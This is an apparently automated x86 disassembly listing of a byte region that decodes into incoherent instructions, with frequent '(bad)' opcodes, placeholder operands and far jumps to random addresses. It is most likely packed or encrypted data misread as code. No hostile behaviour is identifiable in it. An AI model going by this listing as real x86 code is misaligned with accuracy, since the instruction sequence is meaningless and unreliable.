  409abd:	ins    DWORD PTR es:[edi],dx
  409abe:	shl    BYTE PTR [edx],1
  409ac0:	mov    DWORD PTR [ebx+0x16a684bd],eax
  409ac6:	retf   
  409ac7:	lods   al,BYTE PTR ds:[esi]
  409ac8:	ror    BYTE PTR [ebx+0x6e],1
  409acb:	jno    0x409a9e
  409acd:	ins    DWORD PTR es:[edi],dx
  409ace:	inc    ebp
  409acf:	mov    ds:0xd188de21,eax
  409ad4:	rcr    BYTE PTR [ecx-0x61e24d1f],1
  409ada:	push   esi
  409adb:	mov    ebx,0x2558479a
  409ae0:	ret    0xb9c4
  409ae3:	pop    esp
  409ae4:	je     0x409b58
  409ae6:	das    
  409ae7:	iret   
  409ae8:	fadd   st(1),st
  409aea:	sub    esi,DWORD PTR [edi+0x67]
  409aed:	pop    es
  409aee:	and    bl,BYTE PTR [ebp+0x5d]
  409af1:	ins    DWORD PTR es:[edi],dx
  409af2:	outs   dx,DWORD PTR ds:[esi]
  409af3:	in     eax,dx
  409af4:	inc    eax
  409af5:	sub    bl,dl
  409af7:	loopne 0x409b27
  409af9:	mov    al,ds:0x3bfd029e
  409afe:	lahf   
  409aff:	in     al,dx
  409b00:	xchg   ecx,eax
  409b01:	xchg   esi,eax
  409b02:	sub    ch,bh
  409b04:	out    dx,al
  409b05:	cmp    bl,bh
  409b07:	xor    DWORD PTR [edi-0x33d10084],ecx
  409b0d:	(bad)  
  409b0e:	pushf  
  409b0f:	jmp    0xec35:0x19aa1af7
  409b16:	mov    bl,0xde
  409b18:	ret    0x41d1
  409b1b:	stc    
  409b1c:	fisttp QWORD PTR [eax-0x6004f83a]
  409b22:	ja     0x409b4b
  409b24:	pushf  
  409b25:	xor    dh,BYTE PTR [esi+0x25]
  409b28:	dec    ebp
  409b29:	inc    edi
  409b2a:	out    0x8,eax
  409b2c:	clc    
  409b2d:	mov    WORD PTR [esi],es
  409b2f:	div    DWORD PTR [ebp-0x6b58b965]
  409b35:	jle    0x409ac1
  409b37:	or     esi,DWORD PTR [esi+0x7c06f8b7]
  409b3d:	push   ebp
  409b3e:	push   0xa211d3c7
  409b43:	loopne 0x409b32
  409b45:	or     edi,DWORD PTR [esi-0x7f]
  409b48:	call   0xb5cc:0xb4e13e3
  409b4f:	mov    BYTE PTR [eax-0x2ca06b04],cl
  409b55:	sbb    eax,0x8a0c3c81
  409b5a:	cli    
  409b5b:	enter  0xd1dd,0xa3
  409b5f:	mov    esp,DWORD PTR [ebp-0x6d70572c]
  409b65:	ds cld 
  409b67:	lahf   
  409b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b69:	mov    ecx,?
  409b6b:	mov    al,0xe7
  409b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b6e:	sub    bl,ah
  409b70:	cmp    eax,0xb333ec48
  409b75:	and    al,0x8c
  409b77:	fist   WORD PTR [esi+0x5d]
  409b7a:	cld    
  409b7b:	inc    eax
  409b7c:	rol    DWORD PTR [ebx-0x25],1
  409b7f:	outs   dx,BYTE PTR ds:[esi]
  409b80:	jp     0x409bf8
  409b82:	push   ebp
  409b83:	mov    al,0xcb
  409b85:	xchg   ebx,eax
  409b86:	inc    esp
  409b87:	sub    ecx,ebx
  409b89:	adc    ecx,ecx
  409b8b:	retf   0x81ae
  409b8e:	outs   dx,DWORD PTR ds:[esi]
  409b8f:	mov    ?,WORD PTR [ebx+0x16a6ecb2]
  409b95:	mov    cl,BYTE PTR [edi]
  409b97:	mov    fs,WORD PTR [esp+ebp*8]
  409b9a:	in     al,0xf0
  409b9c:	mov    ah,0x8f
  409b9e:	mov    bh,0xd5
  409ba0:	ins    DWORD PTR es:[edi],dx
  409ba1:	mov    edx,0x11434bf2
  409ba6:	xlat   BYTE PTR ds:[ebx]
  409ba7:	xor    bl,BYTE PTR [edx+0x0]
  409baa:	mov    ch,0x68
  409bac:	or     eax,DWORD PTR [edi]
  409bae:	test   BYTE PTR [ecx-0x7fd00e6e],cl
  409bb4:	je     0x409b8b
  409bb6:	inc    eax
  409bb7:	mov    DWORD PTR [edi+0x7e9f46bf],esp
  409bbd:	xchg   ecx,eax
  409bbe:	jno    0x38cf4ba1
  409bc4:	xor    al,0xec
  409bc6:	lock adc ebx,edx
  409bc9:	jo     0x409b65
  409bcb:	cld    
  409bcc:	int3   
  409bcd:	imul   eax,DWORD PTR [ecx+0x27],0x842a320a
  409bd4:	xchg   DWORD PTR [eax],edi
  409bd6:	jno    0x409b95
  409bd8:	pop    ds
  409bd9:	hlt    
  409bda:	xchg   DWORD PTR [ebp-0xbec0f88],ebp
  409be0:	xchg   edi,eax
  409be1:	mov    edi,0x52dd0d5d
  409be6:	fiadd  WORD PTR [ecx-0xa]
  409be9:	pop    ds
  409bea:	pushf  
  409beb:	push   esp
  409bec:	sti    
  409bed:	sub    eax,0x87d2c51c
  409bf2:	mov    cl,0x6
  409bf4:	jp     0x409c53
  409bf6:	push   esi
  409bf7:	jmp    0x9dfc:0x2ec00d79
  409bfe:	fist   DWORD PTR [edi-0x7f5abbbc]
  409c04:	xchg   esi,eax
  409c05:	dec    ebx
  409c06:	nop
  409c07:	mov    dl,0x12
  409c09:	bound  eax,QWORD PTR [edx+0x70]
  409c0c:	int    0x51
  409c0e:	iret   
  409c0f:	jno    0x409c65
  409c11:	sahf   
  409c12:	mov    ss,WORD PTR [ebx+edx*4]
  409c15:	js     0x409ba4
  409c17:	adc    al,BYTE PTR [ecx-0x7d]
  409c1a:	inc    esi
  409c1b:	aam    0xb
  409c1d:	ins    DWORD PTR es:[edi],dx
  409c1e:	sub    edi,edi
  409c20:	cmp    esp,DWORD PTR [edi-0x165d96e8]
  409c26:	call   0x12149879
  409c2b:	mov    dh,0x9f
  409c2d:	jmp    0x2cdf4a5b
  409c32:	mov    WORD PTR [edx],gs
  409c34:	scas   eax,DWORD PTR es:[edi]
  409c35:	pop    edx
  409c36:	jo     0x409bd9
  409c38:	lahf   
  409c39:	std    
  409c3a:	nop
  409c3b:	dec    BYTE PTR [edx-0xcdc5f2f]
  409c41:	pop    ecx
  409c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c43:	pusha  
  409c44:	fbld   TBYTE PTR [edx]
  409c46:	pop    esp
  409c47:	out    dx,eax
  409c48:	cdq    
  409c49:	xrelease mov DWORD PTR [edi+0x317eb5cd],ebx
  409c50:	and    al,0x59
  409c52:	lahf   
  409c53:	inc    esp
  409c54:	aaa    
  409c55:	cmp    ch,BYTE PTR [ebp-0x68]
  409c58:	adc    eax,0x85b93861
  409c5d:	out    dx,al
  409c5e:	fucomi st,st(1)
  409c60:	sub    ecx,ebp
  409c62:	cmc    
  409c63:	jno    0x409c2d
  409c65:	mov    bl,0xc8
  409c67:	arpl   WORD PTR [ebx],ax
  409c69:	adc    edi,ecx
  409c6b:	and    esi,edi
  409c6d:	xor    bh,BYTE PTR [ebp+0x60a9e92]
  409c73:	push   eax
  409c74:	push   0xf5dba886
  409c79:	cmp    al,0x7
  409c7b:	out    0xc2,al
  409c7d:	and    al,0xad
  409c7f:	repz int3 
  409c81:	xchg   edi,ecx
  409c83:	sub    DWORD PTR [ebx-0x3d947796],ecx
  409c89:	inc    esi
  409c8a:	cld    
  409c8b:	add    ebx,DWORD PTR [edx]
  409c8d:	jno    0x409c4e
  409c8f:	sti    
  409c90:	in     eax,0x2b
  409c92:	cdq    
  409c93:	outs   dx,BYTE PTR ds:[esi]
  409c94:	jp     0x409c2c
  409c96:	sub    ebx,esp
  409c98:	ror    ebx,1
  409c9a:	into   
  409c9b:	(bad)  
  409c9c:	sbb    al,0x3e
  409c9e:	int3   
  409c9f:	mul    DWORD PTR [ebx-0x5bb89220]
  409ca5:	mov    DWORD PTR [esi-0x5bde2758],ebp
  409cab:	jmp    0xbbcb912f
  409cb0:	adc    DWORD PTR fs:[ebx],0x817ddb82
  409cb7:	fidiv  DWORD PTR [eax+0x7]
  409cba:	inc    ebx
  409cbb:	in     al,0x20
  409cbd:	stos   DWORD PTR es:[edi],eax
  409cbe:	shl    bh,1
  409cc0:	mov    al,0x4c
  409cc2:	jae    0x409c6e
  409cc4:	mov    ds:0xb839b342,al
  409cc9:	adc    esi,DWORD PTR [ebx-0x3bbd4d3f]
  409ccf:	out    0xf7,al
  409cd1:	dec    eax
  409cd2:	adc    al,0x7
  409cd4:	sbb    DWORD PTR [eax],edx
  409cd6:	dec    ebx
  409cd7:	dec    edx
  409cd8:	jp     0x409c6d
  409cda:	sbb    eax,0xd3d7eb82
  409cdf:	popa   
  409ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce1:	pop    edi
  409ce2:	mov    ?,WORD PTR [ebx+0x57e4d09f]
  409ce8:	cmp    DWORD PTR [ebx-0x67fba842],0xfffffff9
  409cef:	add    BYTE PTR [ebx-0x6d7c2788],ch
  409cf5:	hlt    
  409cf6:	or     al,0x3b
  409cf8:	fidivr DWORD PTR [ebp+0x3e07f4dc]
  409cfe:	shr    BYTE PTR [ebp+ecx*1-0x10421f4a],0x47
  409d06:	js     0x409cfa
  409d08:	scas   eax,DWORD PTR es:[edi]
  409d09:	sahf   
  409d0a:	push   0x437f85e4
  409d0f:	mov    eax,0xbf8432a8
  409d14:	js     0x409d14
  409d16:	fmul   st,st(2)
  409d18:	add    al,0x6c
  409d1a:	test   DWORD PTR [edx],edi
  409d1c:	ret    
  409d1d:	sti    
  409d1e:	clc    
  409d1f:	jne    0x409ca4
  409d21:	out    dx,eax
  409d22:	inc    ebx
  409d23:	out    0xb7,al
  409d25:	call   0xf6e9:0xc2e32a12
  409d2c:	(bad)  
  409d2d:	aam    0x38
  409d2f:	mov    edi,0xd18c8480
  409d34:	nop
  409d35:	adc    DWORD PTR fs:[eax+ebp*2-0x1068ea71],eax
  409d3d:	add    DWORD PTR [ecx+0x43],esi
  409d40:	clc    
  409d41:	pop    edx
  409d42:	scas   al,BYTE PTR es:[edi]
  409d43:	jl     0x409d3c
  409d45:	sbb    eax,DWORD PTR [edx+0x28]
  409d48:	dec    esi
  409d49:	scas   eax,DWORD PTR es:[edi]
  409d4a:	in     eax,0x2c
  409d4c:	fsubr  QWORD PTR [ebx+edi*1]
  409d4f:	pop    edi
  409d50:	adc    al,0xb8
  409d52:	add    eax,0x8d7b8e41
  409d57:	mov    WORD PTR [eax+0x2791b9e0],ss
  409d5d:	jge    0x409d62
  409d5f:	sbb    eax,0x81990353
  409d64:	xchg   esp,eax
  409d65:	js     0x409cf3
  409d67:	mov    eax,ds:0xf11accab
  409d6c:	jp     0x8b1b26c8
  409d72:	rcr    cl,cl
  409d74:	cwde   
  409d75:	and    eax,0xa6627c9b
  409d7a:	mov    ds:0x818205c9,al
  409d7f:	adc    DWORD PTR [edx-0x5f],ebx
  409d82:	jmp    0x9d3e:0xdb425231
  409d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8a:	(bad)  
  409d8b:	mov    ch,0x52
  409d8d:	idiv   DWORD PTR [ebx]
  409d8f:	shl    BYTE PTR ds:0x650eec46,cl
  409d95:	pop    esi
  409d96:	adc    BYTE PTR [esi+0x33afc3da],0xa7
  409d9d:	cwde   
  409d9e:	push   ss
  409d9f:	ret    
  409da0:	push   edi
  409da1:	jmp    0xe0107cff
  409da6:	mov    ds:0xc7eec39a,eax
  409dab:	mov    al,ds:0xb65336e1
  409db0:	jno    0x409e1d
  409db2:	das    
  409db3:	jb     0x409d89
  409db5:	fwait
  409db6:	inc    esi
  409db7:	ins    BYTE PTR es:[edi],dx
  409db8:	mov    bl,0xeb
  409dba:	pop    ecx
  409dbb:	int3   
  409dbc:	cmp    al,bh
  409dbe:	jg     0x409e0c
  409dc0:	inc    ecx
  409dc1:	mov    bh,0xbc
  409dc3:	xchg   ecx,eax
  409dc4:	push   ds
  409dc5:	xor    al,0x35
  409dc7:	rol    BYTE PTR [esi-0x72],1
  409dca:	gs pop es
  409dcc:	cdq    
  409dcd:	enter  0xefc8,0xee
  409dd1:	out    0x0,al
  409dd3:	aaa    
  409dd4:	push   ss
  409dd5:	loope  0x409dbe
  409dd7:	xchg   BYTE PTR [ebx-0x60],al
  409dda:	fdivr  st,st(1)
  409ddc:	mov    ebp,edi
  409dde:	push   edx
  409ddf:	stos   DWORD PTR es:[edi],eax
  409de0:	and    eax,0x35fa6cf5
  409de5:	sbb    DWORD PTR [edi-0x6c],0xffffff93
  409de9:	push   0xffffffd2
  409deb:	aad    0xe5
  409ded:	fcmovnb st,st(7)
  409def:	repnz pop ds
  409df1:	mov    BYTE PTR [ecx+0x6f9b1fda],bl
  409df7:	hlt    
  409df8:	jmp    0xf06d060c
  409dfd:	ins    BYTE PTR es:[edi],dx
  409dfe:	mov    ah,0x4b
  409e00:	or     BYTE PTR [ebp-0x11],bh
  409e03:	mov    ds:0x1d30559b,al
  409e08:	cmc    
  409e09:	out    0xad,al
  409e0b:	stos   BYTE PTR es:[edi],al
  409e0c:	and    eax,esp
  409e0e:	jle    0x409df3
  409e10:	loop   0x409e83
  409e12:	das    
  409e13:	or     dh,BYTE PTR [eax-0x2adcdad8]
  409e19:	pop    edi
  409e1a:	cmp    esp,DWORD PTR [edi-0x5a6b7573]
  409e20:	or     edx,DWORD PTR [ebx-0x22db41c3]
  409e26:	fnsave [esi]
  409e28:	jg     0x409dde
  409e2a:	lock jo 0x409e62
  409e2d:	inc    esp
  409e2e:	test   ch,al
  409e30:	push   esi
  409e31:	dec    ebx
  409e32:	adc    BYTE PTR [edx-0x3dd59c8e],dl
  409e38:	fld    QWORD PTR [ecx-0x12]
  409e3b:	and    ch,ah
  409e3d:	(bad)  
  409e3e:	cmc    
  409e3f:	nop
  409e40:	fsub   st(4),st
  409e42:	jg     0x409e1f
  409e44:	aad    0xa5
  409e46:	sbb    ebx,DWORD PTR [edx-0x5fe9a334]
  409e4c:	addr16 sbb bl,bh
  409e4f:	les    eax,FWORD PTR [edx-0x3808d90e]
  409e55:	loopne 0x409e2b
  409e57:	xor    edx,DWORD PTR [ebx]
  409e59:	dec    edx
  409e5a:	imul   ebp,DWORD PTR [ebx+0x7e],0x2cd4a69f
  409e61:	aam    0x70
  409e63:	mov    ebx,0xf3af11fd
  409e68:	cmp    edi,DWORD PTR [edx]
  409e6a:	and    al,0x16
  409e6c:	xchg   DWORD PTR [eax],edx
  409e6e:	mov    dl,0xce
  409e70:	lahf   
  409e71:	add    BYTE PTR [eax-0x3f],0x14
  409e75:	ret    0x709
  409e78:	popa   
  409e79:	cmp    bl,BYTE PTR [ebp-0x2289e095]
  409e7f:	into   
  409e80:	outs   dx,BYTE PTR ds:[esi]
  409e81:	adc    BYTE PTR ds:0x12c89700,ch
  409e87:	or     ah,bl
  409e89:	in     al,dx
  409e8a:	dec    ebx
  409e8b:	jl     0x409e6e
  409e8d:	nop
  409e8e:	bnd jne 0x409e39
  409e91:	mov    ?,WORD PTR [edx-0x3e72917d]
  409e97:	ds jmp 0x8b4e8537
  409e9d:	popf   
  409e9e:	jns    0x409ed3
  409ea0:	inc    eax
  409ea1:	rcl    dl,1
  409ea3:	bound  edx,QWORD PTR [esi+0x70]
  409ea6:	shl    DWORD PTR [ebx],cl
  409ea8:	sub    eax,0x242d2fa
  409ead:	ret    
  409eae:	dec    edx
  409eaf:	cld    
  409eb0:	(bad)  
  409eb2:	xor    ebx,DWORD PTR [esi-0x333930fd]
  409eb8:	push   edi
  409eb9:	push   0xa
  409ebb:	sbb    DWORD PTR [edx],edi
  409ebd:	inc    ebx
  409ebe:	lahf   
  409ebf:	int3   
  409ec0:	jno    0x409e95
  409ec2:	daa    
  409ec3:	cmp    BYTE PTR [edi-0x47b1185c],dl
  409ec9:	std    
  409eca:	push   esp
  409ecb:	fs leave 
  409ecd:	je     0x409ef0
  409ecf:	pop    edi
  409ed0:	cmp    BYTE PTR ds:0xdb1df066,dh
  409ed6:	mov    ds:0x85ebe713,al
  409edb:	icebp  
  409edc:	pop    ds
  409edd:	not    DWORD PTR [ecx]
  409edf:	xor    DWORD PTR [ebx+0x7565164d],esi
  409ee5:	ins    BYTE PTR es:[edi],dx
  409ee6:	pusha  
  409ee7:	mov    eax,ds:0x4ad581ef
  409eec:	sub    ch,BYTE PTR [edx]
  409eee:	out    dx,eax
  409eef:	cmp    eax,0xc4e6565f
  409ef4:	jmp    0xf79519e3
  409ef9:	dec    esp
  409efa:	outs   dx,DWORD PTR ds:[esi]
  409efb:	xor    ebp,DWORD PTR [edx-0x4f]
  409efe:	fldcw  WORD PTR [ebp-0x45e03ee]
  409f04:	pop    ecx
  409f05:	gs scas eax,DWORD PTR es:[edi]
  409f07:	adc    bh,BYTE PTR [ebp+0x7446a0c6]
  409f0d:	(bad)  
  409f0e:	lods   al,BYTE PTR ds:[esi]
  409f0f:	jns    0x409f8a
  409f11:	adc    esi,DWORD PTR [ebx+0x3c]
  409f14:	add    BYTE PTR [ecx],0xd0
  409f17:	aas    
  409f18:	rol    ah,cl
  409f1a:	sub    DWORD PTR [eax],0xd5b5496d
  409f20:	clc    
  409f21:	jns    0x409f60
  409f23:	into   
  409f24:	aam    0x60
  409f26:	jbe    0x409f54
  409f28:	pop    ecx
  409f29:	mov    edx,0x976c8d7d
  409f2e:	icebp  
  409f2f:	jmp    0xf3ce:0x45de8291
  409f36:	xchg   esp,eax
  409f37:	mov    ds,WORD PTR [eax]
  409f39:	xor    ch,BYTE PTR [ecx+0x1a]
  409f3c:	sub    bh,BYTE PTR cs:[eax+0x12]
  409f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f41:	aad    0x47
  409f43:	xchg   esp,eax
  409f44:	iret   
  409f45:	jle    0x409f85
  409f47:	rcr    ecx,cl
  409f49:	test   BYTE PTR [ebp+0x5b6c17a1],bh
  409f4f:	iret   
  409f50:	or     eax,DWORD PTR [edi]
  409f52:	lods   eax,DWORD PTR ds:[esi]
  409f53:	pop    es
  409f54:	stos   BYTE PTR es:[edi],al
  409f55:	cmp    dl,BYTE PTR [eax+ecx*8-0x42]
  409f59:	fadd   QWORD PTR [edx+esi*4+0x7f73aba5]
  409f60:	jg     0x409f29
  409f62:	jns    0x409fcc
  409f64:	lods   al,BYTE PTR ds:[esi]
  409f65:	mov    BYTE PTR [eax],cl
  409f67:	mov    BYTE PTR [ebp+edx*4-0x37],bh
  409f6b:	sub    edx,edx
  409f6d:	jns    0x409ef4
  409f6f:	sbb    BYTE PTR [edx],al
  409f71:	push   ebx
  409f72:	xchg   ecx,eax
  409f73:	outs   dx,DWORD PTR ds:[esi]
  409f74:	sbb    ecx,edx
  409f76:	xchg   BYTE PTR [edi-0x360b013f],bl
  409f7c:	adc    BYTE PTR [esi-0x220f8c8d],cl
  409f82:	mov    DWORD PTR [eax-0x63],0x8a9e2467
  409f89:	jl     0x409fcb
  409f8b:	in     al,dx
  409f8c:	sbb    bh,al
  409f8e:	jnp    0x409f9d
  409f90:	cmp    cl,BYTE PTR [esi+ebx*1-0x9]
  409f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f95:	sbb    edi,esp
  409f97:	std    
  409f98:	pop    ecx
  409f99:	xchg   esp,eax
  409f9a:	dec    ecx
  409f9b:	pop    ss
  409f9c:	fsubr  QWORD PTR [ebx-0x38]
  409f9f:	test   BYTE PTR [eax-0x8de100c],ch
  409fa5:	sti    
  409fa6:	adc    ah,BYTE PTR [ebp-0x20]
  409fa9:	push   es
  409faa:	fnstsw WORD PTR [eax+0x5c]
  409fad:	in     eax,0xdd
  409faf:	inc    ebp
  409fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fb1:	or     esi,edi
  409fb3:	fist   WORD PTR [ebx]
  409fb5:	dec    ecx
  409fb6:	aas    
  409fb7:	js     0x409f57
  409fb9:	fist   WORD PTR [ebp+0xc]
  409fbc:	adc    BYTE PTR [edx],0x6e
  409fbf:	int    0x92
  409fc1:	addr16 xchg ecx,eax
  409fc3:	jbe    0x409f72
  409fc5:	ins    BYTE PTR es:[edi],dx
  409fc6:	idiv   DWORD PTR [ecx+0x7b]
  409fc9:	pop    ecx
  409fca:	iret   
  409fcb:	fwait
  409fcc:	js     0x409f56
  409fce:	mov    dh,0x8e
  409fd0:	imul   ecx,DWORD PTR [esp+ebx*8-0x1018f5eb],0xffffff82
  409fd8:	(bad)  
  409fd9:	sbb    BYTE PTR [ebp-0x4236d392],bh
  409fdf:	xchg   esp,eax
  409fe0:	mov    edi,0xfa2c494d
  409fe5:	adc    eax,0x5ced7d18
  409fea:	pop    ebx
  409feb:	arpl   WORD PTR [edx],bp
  409fed:	imul   ebx,DWORD PTR [esi],0x2d
  409ff0:	add    ebx,edx
  409ff2:	xchg   edx,eax
  409ff3:	dec    esp
  409ff4:	stc    
  409ff5:	aad    0xae
  409ff7:	sbb    al,0x9e
  409ff9:	inc    esp
  409ffa:	bound  esi,QWORD PTR [ebx]
  409ffc:	adc    DWORD PTR [ebx-0x18512b7b],esp
  40a002:	xlat   BYTE PTR ds:[ebx]
  40a003:	jle    0x40a069
  40a005:	aaa    
  40a006:	ja     0x40a022
  40a008:	daa    
  40a009:	stc    
  40a00a:	inc    eax
  40a00b:	jae    0x409fd1
  40a00d:	fistp  DWORD PTR [eax+0x3f]
  40a010:	jg     0x409f95
  40a012:	cmp    al,BYTE PTR [ebp-0x70]
  40a015:	push   ds
  40a016:	inc    eax
  40a017:	inc    esp
  40a018:	adc    DWORD PTR [ebp+0x63c07723],esp
  40a01e:	adc    al,BYTE PTR [ecx+0x20]
  40a021:	ja     0x409fa7
  40a023:	or     BYTE PTR [eax],dh
  40a025:	cmp    edi,ebx
  40a027:	(bad)  
  40a028:	fcom   st(5)
  40a02a:	mov    edi,0xc2bf7364
  40a02f:	mov    BYTE PTR [ebx],bh
  40a031:	or     BYTE PTR [eax-0x21baef84],ch
  40a037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a038:	int3   
  40a039:	pushf  
  40a03a:	jno    0x40a021
  40a03c:	out    dx,eax
  40a03d:	ds push ebp
  40a03f:	push   ecx
  40a040:	out    0xfc,eax
  40a042:	(bad)  [ebx+0x15]
  40a045:	sbb    al,0x5
  40a047:	fs test eax,0x92140c08
  40a04d:	mov    bh,BYTE PTR [ebx]
  40a04f:	pop    ecx
  40a050:	ins    DWORD PTR es:[edi],dx
  40a051:	adc    al,BYTE PTR [edi+0x32]
  40a054:	inc    ebx
  40a055:	or     dl,BYTE PTR [esi+esi*1+0x6911ec69]
  40a05c:	push   ds
  40a05d:	mov    al,ds:0xb12ab11
  40a062:	lea    ebx,[edx+0x73]
  40a065:	lock ror BYTE PTR [ebp+0x18],cl
  40a069:	aas    
  40a06a:	sub    bh,cl
  40a06c:	outs   dx,BYTE PTR ds:[esi]
  40a06d:	out    0x2e,eax
  40a06f:	lds    ebp,FWORD PTR [edx+0x3c]
  40a072:	pop    edi
  40a073:	jg     0x40a089
  40a075:	xchg   DWORD PTR [ecx],ecx
  40a077:	sbb    eax,DWORD PTR [edx-0x38]
  40a07a:	inc    BYTE PTR [edi+eax*2-0x18]
  40a07e:	mov    bh,0xc2
  40a080:	adc    BYTE PTR [esi],ch
  40a082:	sub    eax,0xa8e1b4fc
  40a087:	push   esi
  40a088:	(bad)  
  40a089:	pop    ecx
  40a08a:	add    al,0xbf
  40a08c:	pop    eax
  40a08d:	or     BYTE PTR [edx-0x7f06a325],bh
  40a093:	jno    0x40a064
  40a095:	mov    cl,0xbd
  40a097:	sub    eax,0xee892f6f
  40a09c:	or     edx,DWORD PTR [ecx]
  40a09e:	xor    BYTE PTR [edx+0x46541af3],al
  40a0a4:	outs   dx,DWORD PTR ds:[esi]
  40a0a5:	mov    cl,0x53
  40a0a7:	fidivr WORD PTR [ebx]
  40a0a9:	pop    ecx
  40a0aa:	lds    ebx,FWORD PTR [ebx+0x4a]
  40a0ad:	outs   dx,BYTE PTR ds:[esi]
  40a0ae:	xchg   DWORD PTR ds:[eax-0x61171fc4],esi
  40a0b5:	imul   DWORD PTR [ecx+0x327a649e]
  40a0bb:	inc    ebx
  40a0bc:	fwait
  40a0bd:	neg    DWORD PTR [ebx-0x4938e379]
  40a0c3:	lea    esi,[edi+0x7c5fb0b1]
  40a0c9:	or     DWORD PTR [eax+eax*1],edx
  40a0cc:	outs   dx,DWORD PTR ds:[esi]
  40a0cd:	push   ecx
  40a0ce:	leave  
  40a0cf:	xor    ah,cl
  40a0d1:	xor    al,0x8
  40a0d3:	xor    eax,0x8964d381
  40a0d8:	push   ds
  40a0d9:	fxam   
  40a0db:	iret   
  40a0dc:	in     al,0x52
  40a0de:	call   0x48125489
  40a0e3:	add    al,BYTE PTR ds:0x84f84201
  40a0e9:	jbe    0x40a142
  40a0eb:	add    eax,0x4a
  40a0ee:	jle    0x40a0e0
  40a0f0:	out    dx,eax
  40a0f1:	daa    
  40a0f2:	retf   0xee8f
  40a0f5:	push   0x943d421e
  40a0fa:	popf   
  40a0fb:	hlt    
  40a0fc:	sub    BYTE PTR [ecx-0x56561e5e],0x20
  40a103:	pushf  
  40a104:	inc    edx
  40a105:	out    0x11,eax
  40a107:	jmp    0x936f26d1
  40a10c:	ror    BYTE PTR [esi-0x5c],1
  40a10f:	dec    esp
  40a110:	retf   0x72fb
  40a113:	outs   dx,DWORD PTR ds:[esi]
  40a114:	js     0x40a17b
  40a116:	add    eax,0x7953a855
  40a11b:	mov    dl,0x45
  40a11d:	aad    0xa7
  40a11f:	mov    ecx,0xb7346fd4
  40a124:	sub    eax,DWORD PTR [eax]
  40a126:	and    eax,0x90a3b257
  40a12b:	xchg   BYTE PTR [esi+eax*8+0x3d],dl
  40a12f:	sub    eax,0x4d511da3
  40a134:	mov    esi,0x3ea63e5
  40a139:	dec    esp
  40a13a:	test   eax,0xdd6c9db4
  40a13f:	jl     0x40a193
  40a141:	ret    0x1977
  40a144:	test   al,0xb
  40a146:	mov    cl,0xbe
  40a148:	je     0x40a105
  40a14a:	jmp    0x40a15b
  40a14c:	jae    0x40a13f
  40a14e:	dec    esp
  40a14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a150:	in     al,0x64
  40a152:	inc    edi
  40a153:	jecxz  0x40a11f
  40a155:	adc    al,0xf2
  40a157:	jg     0x40a137
  40a159:	jmp    0x40a0e4
  40a15b:	xchg   esi,eax
  40a15c:	fstp   TBYTE PTR [ebx+0x1e9f8feb]
  40a162:	scas   al,BYTE PTR es:[edi]
  40a163:	mov    bh,0xc9
  40a165:	aad    0xe8
  40a167:	(bad)  
  40a168:	mov    ds:0xb7bcd0cf,eax
  40a16d:	repz test ebp,eax
  40a170:	push   ss
  40a171:	xchg   esp,eax
  40a172:	xor    edx,DWORD PTR cs:[edx-0xba58cd0]
  40a179:	push   ebx
  40a17a:	stos   DWORD PTR es:[edi],eax
  40a17b:	mov    ch,0xd5
  40a17d:	lods   al,BYTE PTR ds:[esi]
  40a17e:	jle    0x40a1f2
  40a180:	sub    dl,bh
  40a182:	xor    DWORD PTR [eax-0x34],0x6144a7b4
  40a189:	mov    bl,0x7
  40a18b:	mov    cs,edi
  40a18d:	xchg   esp,eax
  40a18e:	sub    al,0x7
  40a190:	sahf   
  40a191:	xor    BYTE PTR [edx+edx*2],ch
  40a194:	and    al,BYTE PTR [esi-0x73]
  40a197:	in     al,0x33
  40a199:	dec    ebp
  40a19a:	gs (bad) 
  40a19c:	jb     0x40a1c4
  40a19e:	mov    dl,0x48
  40a1a0:	repnz cmp eax,0xc20e9926
  40a1a6:	fwait
  40a1a7:	and    bl,dh
  40a1a9:	inc    eax
  40a1aa:	xor    BYTE PTR [edx-0x4b84a51e],al
  40a1b0:	ret    
  40a1b1:	int    0xed
  40a1b3:	sub    BYTE PTR [eax],bh
  40a1b5:	inc    esi
  40a1b6:	or     al,0x6d
  40a1b8:	jns    0x40a20a
  40a1ba:	and    BYTE PTR [ebp-0x7b57db24],dh
  40a1c0:	and    BYTE PTR [ebp+0x53],dh
  40a1c3:	aas    
  40a1c4:	repnz mov ah,0xbb
  40a1c7:	mov    bh,0xa3
  40a1c9:	shl    DWORD PTR [ebp+eax*2+0x16],1
  40a1cd:	push   edx
  40a1ce:	cli    
  40a1cf:	daa    
  40a1d0:	jae    0x40a21c
  40a1d2:	cli    
  40a1d3:	and    al,0xc6
  40a1d5:	xlat   BYTE PTR ds:[ebx]
  40a1d6:	out    0xf5,al
  40a1d8:	js     0x40a170
  40a1da:	pop    esp
  40a1db:	mov    ebx,DWORD PTR [edi-0x70]
  40a1de:	push   0xffffff9d
  40a1e0:	shl    DWORD PTR [eax+0x0],0x84
  40a1e4:	cmp    eax,0x8831da5b
  40a1e9:	jb     0x40a200
  40a1eb:	(bad)  
  40a1ec:	jmp    0x381ac9d8
  40a1f1:	imul   esi,DWORD PTR [ecx-0x3cda16b3],0xf8f3999e
  40a1fb:	pop    ss
  40a1fc:	sbb    al,0x88
  40a1fe:	stos   BYTE PTR es:[edi],al
  40a1ff:	loopne 0x40a1a8
  40a201:	jnp    0x40a211
  40a203:	mov    DWORD PTR [ebp+0x4a],0x288257a2
  40a20a:	pop    esp
  40a20b:	adc    ecx,DWORD PTR fs:[edi+edx*2-0xb71f162]
  40a213:	pusha  
  40a214:	fidiv  DWORD PTR ds:0xb73aa591
  40a21a:	mov    bl,0x35
  40a21c:	mov    eax,ds:0xa1fa8ecf
  40a221:	sbb    ch,BYTE PTR [ecx]
  40a223:	ja     0x40a1ba
  40a225:	mov    ah,0x70
  40a227:	inc    esi
  40a228:	sub    edx,0x5c2b75c2
  40a22e:	mov    edx,0x39196165
  40a233:	nop
  40a234:	adc    BYTE PTR [eax],bl
  40a236:	dec    esi
  40a237:	jmp    0x15a3a8c3
  40a23c:	jl     0x40a2ae
